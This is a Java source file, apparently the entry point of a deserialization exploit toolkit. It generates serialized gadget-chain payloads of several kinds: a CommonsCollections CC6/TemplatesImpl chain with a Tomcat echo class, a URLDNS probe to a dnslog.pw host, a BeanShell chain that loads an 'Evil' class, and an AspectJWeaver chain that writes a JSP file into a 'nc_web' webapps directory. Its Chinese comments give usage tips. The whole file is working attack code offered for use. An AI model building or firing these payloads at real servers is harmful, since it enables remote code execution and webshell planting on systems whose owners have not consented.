package exp;

import payload.AspectJWeaver;
import payload.CommonCollections;
import payload.urldns;
import tools.*;
import payload.BeanShell;

import java.io.*;
import java.util.zip.GZIPOutputStream;

public class Main {
    public static void main(String[] args) throws Exception{
        Object exp;
        ObjectOutputStream oos;
        String name = "CommonCollections";
        switch (name) {
            case "CommonCollections":
                exp = new CommonCollections().CC6_TemplatesImpl(TomcatEcho.class.getName());
                oos = new ObjectOutputStream(new FileOutputStream("./cc"));
                oos.writeObject(exp);
                oos.close();
                break;
            case "urldns":
                exp = new urldns().dnslog("http://123asd.j1n34lgn.dnslog.pw");
                oos = new ObjectOutputStream(new FileOutputStream("./urldns"));
                oos.writeObject(exp);
                oos.close();
                break;
            //建议直接命令执行,回显有问题
            case "beanshell":
                exp = new BeanShell().classloader(Evil.class);
                oos = new ObjectOutputStream(new FileOutputStream("./beanshell"));
                oos.writeObject(exp);
                oos.close();
                break;
            //aspectjweaver配合cc链反序列化,上传文件
            case "aspectjweaver":
                String filename = "123.jsp";
                String filepath = "./webapps/nc_web/";
                String filecontent = "test123";
                exp = new AspectJWeaver().upload(filename, filepath, filecontent);
                oos = new ObjectOutputStream(new FileOutputStream("./aspectjweaver"));
                oos.writeObject(exp);
                oos.close();
                break;
        }
    }
    //gzip压缩
    public static void gzip(String file) throws Exception{
        FileInputStream inputFromFile = new FileInputStream(file);
        byte[] bs = new byte[inputFromFile.available()];
        inputFromFile.read(bs);
        GZIPOutputStream gzip = new GZIPOutputStream(new FileOutputStream(file+".gz"));
        gzip.write(bs);
        gzip.close();
    }
}
